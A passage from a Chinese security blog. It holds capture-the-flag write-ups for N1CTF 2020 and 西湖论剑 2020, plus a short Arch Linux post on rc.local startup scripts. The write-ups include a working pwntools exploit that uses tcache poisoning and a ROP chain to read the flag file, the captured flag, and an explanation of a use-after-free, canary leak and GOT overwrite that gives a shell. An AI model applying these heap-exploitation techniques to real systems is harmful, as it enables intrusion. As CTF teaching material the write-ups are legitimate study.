class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">258</span>):</span><br><span class="line">		li(<span class="string">&#x27;ad: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		ad(<span class="number">1</span>, i)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">258</span>):</span><br><span class="line">		li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>((<span class="number">0xef0</span> - <span class="number">0x6e0</span>) / <span class="number">8</span>) - <span class="number">1</span>):</span><br><span class="line">		li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	dp(<span class="number">1</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">	libc_base = <span class="number">0</span></span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">	libc_base = leak -  <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line">	<span class="comment">#libc_base = leak -  0x3afc40 - 96</span></span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	t = <span class="number">0x20</span> + <span class="number">0x30</span> + <span class="number">0x50</span> + <span class="number">0x90</span> + <span class="number">0x110</span> + <span class="number">0x210</span> + <span class="number">0x410</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(t / <span class="number">8</span>)):</span><br><span class="line">		li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#rm(1)</span></span><br><span class="line">	dp(<span class="number">1</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	heap_base = leak - (<span class="number">0x55a7e41cee70</span> - <span class="number">0x55a7e41bd000</span>)</span><br><span class="line">	li(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">	t = <span class="number">72721</span> + <span class="number">593</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(t / <span class="number">8</span>) - <span class="number">4</span>):</span><br><span class="line">		li(<span class="string">&#x27;rm: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">	</span><br><span class="line">	li(<span class="string">&#x27;environ: &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">	ad(<span class="number">1</span>, environ + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	dp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	stack = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">	li(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">	stack_ret = stack - (<span class="number">0x7ffc90831238</span> - <span class="number">0x7ffc90831128</span>)</span><br><span class="line">	</span><br><span class="line">	li(<span class="string">&#x27;stack ret: &#x27;</span> + <span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># passby free size check</span></span><br><span class="line">	<span class="comment"># recovery as normal</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0x31</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0x31</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># modify tcache struct </span></span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="comment"># 0x41</span></span><br><span class="line">	p_a = heap_base + (<span class="number">0x556b504f0ee0</span> -  <span class="number">0x556b504df000</span>)</span><br><span class="line">	li(<span class="string">&#x27;heap_0x41: &#x27;</span> + <span class="built_in">hex</span>(p_a))</span><br><span class="line">	ad(<span class="number">1</span>, p_a)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">		ad(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">	p_a =  heap_base + (<span class="number">0x55f0423c1f30</span> -  <span class="number">0x55f0423b0000</span>)</span><br><span class="line">	li(<span class="string">&#x27;heap_0x71: &#x27;</span> + <span class="built_in">hex</span>(p_a))</span><br><span class="line">	ad(<span class="number">1</span>, p_a)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">		ad(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">	flag = <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line">	flag = flag.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	flag_addr  = heap_base + <span class="number">0xc0</span></span><br><span class="line">	ad(<span class="number">1</span>, u64(flag)) <span class="comment"># heap_base  + 0xc0</span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">1</span>, stack_ret)</span><br><span class="line"></span><br><span class="line">	libc_read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	libc_open = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	libc_puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x2155f</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x23e8a</span></span><br><span class="line">	pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">	pop_rdx_rsi = libc_base + <span class="number">0x130889</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#	# ret to here</span></span><br><span class="line"><span class="comment">#	# open</span></span><br><span class="line">	ad(<span class="number">2</span>, pop_rdi)</span><br><span class="line">	ad(<span class="number">2</span>, flag_addr)</span><br><span class="line">	ad(<span class="number">2</span>, pop_rdx_rsi)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">2</span>, libc_open)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	ad(<span class="number">2</span>, pop_rdi)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">	ad(<span class="number">2</span>, pop_rsi)</span><br><span class="line">	ad(<span class="number">2</span>, flag_addr + <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">2</span>, pop_rdx)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">2</span>, libc_read)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># puts</span></span><br><span class="line">	ad(<span class="number">2</span>, pop_rdi)</span><br><span class="line">	ad(<span class="number">2</span>, flag_addr + <span class="number">0x100</span>)</span><br><span class="line">	ad(<span class="number">2</span>, libc_puts)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># trigger</span></span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:0000000000001032                 leave</span></span><br><span class="line"><span class="string">.text:0000000000001033                 retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>经过漫长的一小时攻打, 终于出了flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] rm: 9157                                                      │</span><br><span class="line">[*] rm: 9158                                                      │</span><br><span class="line">[*] rm: 9159                                                      │</span><br><span class="line">[*] environ: 0x7fc86fe37098                                       │</span><br><span class="line">[*] stack: 0x7ffefb537f88                                         │ </span><br><span class="line">[*] stack ret: 0x7ffefb537e78                                     │</span><br><span class="line">[*] heap_0x41: 0x5613330b7ee0                                     │</span><br><span class="line">[*] heap_0x71: 0x5613330b7f30                                     │</span><br><span class="line">[*] Switching to interactive mode                                 │</span><br><span class="line">n1ctf&#123;77381c470c0d50e9ecd15a650e409176&#125;                           │</span><br><span class="line">                                                                  │</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>





<h2 id="easy-write"><a href="#easy-write" class="headerlink" title="easy write"></a>easy write</h2><p>使用cutter反编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    undefined8 uVar1;</span><br><span class="line">    <span class="keyword">int64_t</span> in_FS_OFFSET;</span><br><span class="line">    <span class="keyword">int64_t</span> var_20h;</span><br><span class="line">    <span class="keyword">int64_t</span> var_18h;</span><br><span class="line">    <span class="keyword">int64_t</span> var_10h;</span><br><span class="line">    <span class="keyword">int64_t</span> var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = *(<span class="keyword">int64_t</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">    func_0x000010b0(_reloc.<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    func_0x000010b0(_reloc.<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    func_0x000010b0(_reloc.<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    alarm(<span class="number">0x3c</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here is your gift:%p\n&quot;</span>, _reloc.setbuf);</span><br><span class="line">    var_18h = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Input your message:&quot;</span>, <span class="number">0x13</span>);</span><br><span class="line">    read(<span class="number">0</span>, var_18h, <span class="number">0x2ff</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Where to write?:&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;var_20h, <span class="number">8</span>);</span><br><span class="line">    *(<span class="keyword">int64_t</span> *)var_20h = var_18h;</span><br><span class="line">    var_10h = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Any last message?:&quot;</span>, <span class="number">0x12</span>);</span><br><span class="line">    read(<span class="number">0</span>, var_10h, <span class="number">0x2f</span>);</span><br><span class="line">    .plt.sec(var_10h);</span><br><span class="line">    uVar1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (var_8h != *(<span class="keyword">int64_t</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">        uVar1 = __stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/18/wp-nu1lctf-2020/" data-id="ckhemv82z003dwdcmdfo357lk" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-linux-config-startup-script" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/10/linux-config-startup-script/" class="article-date">
  <time datetime="2020-10-10T10:02:57.000Z" itemprop="datePublished">2020-10-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/10/linux-config-startup-script/">linux-config-startup-script</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Archlinux-如何设置自己的开机脚本"><a href="#Archlinux-如何设置自己的开机脚本" class="headerlink" title="Archlinux 如何设置自己的开机脚本"></a>Archlinux 如何设置自己的开机脚本</h1><p>以下命令以<code>root</code>用户执行<br> 1.创建一个启动service脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/systemd/system/rc-local.service</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=&quot;/etc/rc.local Compatibility&quot; </span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/etc/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">StandardInput=tty</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>2.创建 /etc/rc.local 文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rc.local</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># /etc/rc.local</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -d /etc/rc.local.d; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">for</span> rcscript <span class="keyword">in</span> /etc/rc.local.d/*.sh; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">test</span> -r <span class="string">&quot;<span class="variable">$&#123;rcscript&#125;</span>&quot;</span> &amp;&amp; sh <span class="variable">$&#123;rcscript&#125;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">unset</span> rcscript</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>3.添加执行权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /etc/rc.local</span><br></pre></td></tr></table></figure>

<p>4.添加/etc/rc.local.d文件夹</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/rc.local.d</span><br></pre></td></tr></table></figure>

<p>5.设置开机自启</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> rc-local.service</span><br></pre></td></tr></table></figure>

<p> sh脚本放在<code>/etc/rc.local.d/</code>里面就可以了 </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/10/linux-config-startup-script/" data-id="ckhemv80j000vwdcmhavmgz2x" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xh-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/08/xh-2020/" class="article-date">
  <time datetime="2020-10-08T15:06:50.000Z" itemprop="datePublished">2020-10-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/08/xh-2020/">西湖论剑-wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><p><a target="_blank" rel="noopener" href="https://github.com/i0gan/">本题下载</a></p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure>



<h3 id="Vul"><a href="#Vul" class="headerlink" title="Vul"></a>Vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">rm</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ptr[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">    --ptr[<span class="number">0</span>];                                   <span class="comment">// uaf</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you need add this content&quot;</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用漏洞再于uaf漏洞, 因为真正的添加和释放是顺序性的, 若释放不是最后一个chunk, 会造成释放最后一个chunk, 该所管理的指针数组中的值清0,形成uaf漏洞</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>程序没有开启pie保护,且程序起初给了堆栈地址, 开辟内存的大小是固定的, 我们只能使用一次fastbin attack.那么我们就想到malloc到堆栈里面, 但是我在堆栈里找了好久满足8字节宽度的0x70~ 0x7f的值, 找到一个, 但是已经在main函数外去了, 且没法break退出main函数。但是我们注意到.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">mode_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h] // 存在溢出到 cannary</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          menu_0();</span><br><span class="line">          v3 = input_n();</span><br><span class="line">          <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;please input your id:&quot;</span>);</span><br><span class="line">          i = input_n();</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)add(i) != <span class="number">1</span> )</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please input your id:&quot;</span>);</span><br><span class="line">        v1 = input_n();</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)rm(v1) != <span class="number">1</span> )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL); <span class="comment">// 存在输入</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your content: %s\n&quot;</span>, &amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    Introl();                                   <span class="comment">// Intro</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是输入3的时候我们可以输入一些东西, 我们就可以在这里布置fastbin 的大小为0x71。若我们开辟内存到堆栈里面, 那么就在堆栈里面布置rop链, 采用ret2libc的打法就ok, 但是我们还得需要泄漏cannary， 这里也是采用 这个输入方式进行泄漏cannary, 输入4即可退出该函数调用rop。</p>
<p>还有一个坑ret2libc的时候, 我们需要找一个再次输入到stack里的代码, 方便我们泄漏libc之后然后再次利用。我找的代码如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0400B5A                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400B5E                 mov     rsi, rax</span><br><span class="line">.text:0000000000400B61                 mov     edi, offset format ; &quot;Your content: %s\n&quot;</span><br><span class="line">.text:0000000000400B66                 mov     eax, 0</span><br><span class="line">.text:0000000000400B6B                 call    _printf</span><br><span class="line">.text:0000000000400B70                 jmp     loc_400AB0</span><br></pre></td></tr></table></figure>

<p>为啥要选这段代码, 灯下你就明白, 总之我们需要找一块代码需要再次向栈里写入数据, 但是没法让输入完毕之后就ret, 而下面这个代码可以控制向哪输入数据并返回, 存在个leave指令, 堆栈就发生了迁移, 没法利用。调试的时候, 发现了一个重要的地方就是, rbp我们是可控的, 且程序没开pie， 那么我们能否改got表在调用该函数岂不是实现了。那我就选择改atoi为system，在调用atoi的时候传入’/bin/sh’即可。且该代码块执行后是个循环的, 会调用到atoi。</p>
